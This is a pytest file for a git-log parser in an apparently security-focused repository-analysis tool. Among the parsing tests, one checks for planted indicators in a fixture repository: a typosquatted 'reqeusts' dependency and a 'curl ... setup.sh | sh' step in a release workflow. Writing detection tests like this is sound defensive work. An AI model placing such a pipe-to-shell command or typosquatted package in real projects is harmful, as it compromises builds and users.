from __future__ import annotations

import datetime as dt
from pathlib import Path

import pytest

from graphsec import git_log


def test_is_git_repo(tiny_repo: Path, tmp_path: Path):
    assert git_log.is_git_repo(tiny_repo)
    assert not git_log.is_git_repo(tmp_path / "nope")


def test_read_commits_parses_numstat(tiny_repo: Path):
    commits = git_log.read_commits(tiny_repo)
    assert len(commits) == 2
    newest = commits[0]
    assert newest.subject == "extend app"
    assert newest.author_email == "ana@example.com"
    assert [c.path for c in newest.changes] == ["src/app.py"]
    assert newest.changes[0].insertions == 1
    assert newest.churn == 1


def test_read_commits_respects_max_commits(tiny_repo: Path):
    assert len(git_log.read_commits(tiny_repo, max_commits=1)) == 1


def test_read_commits_rejects_non_repo(tmp_path: Path):
    with pytest.raises(git_log.GitError):
        git_log.read_commits(tmp_path / "missing")


def test_list_files(tiny_repo: Path):
    assert set(git_log.list_files(tiny_repo)) == {"README.md", "src/app.py"}


def test_show_added_lines(tiny_repo: Path):
    head = git_log.read_commits(tiny_repo, max_commits=1)[0]
    added = git_log.show_added_lines(tiny_repo, head.sha)
    assert "print('there')" in added


def test_added_lines_by_file(planted_repo: Path):
    head = git_log.read_commits(planted_repo, max_commits=1)[0]
    by_file = git_log.added_lines_by_file(planted_repo, head.sha)
    assert set(by_file) == {
        ".github/workflows/release.yml",
        "requirements.txt",
        "src/auth/session.py",
    }
    assert "reqeusts==9.9.9" in by_file["requirements.txt"]
    assert "curl https://cdn.example.net/setup.sh | sh" in by_file[
        ".github/workflows/release.yml"
    ]
    # The "+++ b/<path>" header itself must not leak into the added text.
    assert "+++" not in by_file["src/auth/session.py"]


@pytest.mark.parametrize(
    "raw",
    [
        "2024-01-08T10:00:00Z",  # git's rendering of a UTC commit
        "2024-01-08T10:00:00z",
        "2024-01-08T10:00:00+00:00",
        "2024-01-08T15:30:00+0530",  # colon-less offset
        "2024-01-08T15:30:00+05:30",
    ],
)
def test_parse_timestamp_accepts_every_git_offset_form(raw):
    """fromisoformat only handles Z and colon-less offsets from 3.11 onward."""
    parsed = git_log.parse_timestamp(raw)
    assert parsed is not None
    assert parsed.tzinfo is not None
    assert parsed.astimezone(dt.timezone.utc).hour == 10


@pytest.mark.parametrize("raw", ["", "   ", "not-a-date", "2024-13-45T99:99:99Z"])
def test_parse_timestamp_rejects_garbage(raw):
    assert git_log.parse_timestamp(raw) is None


def test_parse_record_handles_utc_z_suffix():
    record = (
        "abc1234\x1fAna\x1fana@example.com\x1f2024-01-08T10:00:00Z\x1finitial commit\x1f\n"
        "1\t0\ta.py"
    )
    commit = git_log._parse_record(record)
    assert commit is not None
    assert commit.authored_at.utcoffset() == dt.timedelta(0)
    assert commit.changes[0].path == "a.py"


def test_parse_record_survives_newline_in_author_identity():
    """A carriage return in an identity is rendered as a newline by git."""
    record = (
        "abc1234\x1fAna\x1fana\nfake-line@example.com\x1f2024-01-08T10:00:00Z"
        "\x1finitial commit\x1f\n1\t0\ta.py"
    )
    commit = git_log._parse_record(record)
    assert commit is not None
    assert commit.author_email == "anafake-line@example.com"
    assert commit.changes[0].path == "a.py"


def test_parse_record_rejects_a_non_sha_first_field():
    record = "not-a-sha\x1fAna\x1fa@b.com\x1f2024-01-08T10:00:00Z\x1fsubject\x1f\n"
    assert git_log._parse_record(record) is None


def test_read_commits_raises_when_nothing_parses(tiny_repo: Path, monkeypatch):
    """An unreadable log must not masquerade as a repository with no history."""
    monkeypatch.setattr(git_log, "parse_timestamp", lambda value: None)
    with pytest.raises(git_log.GitError, match="could not parse any"):
        git_log.read_commits(tiny_repo)


@pytest.mark.parametrize(
    "spec,expected",
    [
        ("src/a.py", ("src/a.py", None)),
        ("old.py => new.py", ("new.py", "old.py")),
        ("src/{old => new}/f.py", ("src/new/f.py", "src/old/f.py")),
    ],
)
def test_split_rename(spec, expected):
    assert git_log._split_rename(spec) == expected


def test_parse_numstat_handles_binary():
    change = git_log._parse_numstat("-\t-\tassets/logo.png")
    assert change is not None
    assert change.binary
    assert change.churn == 0
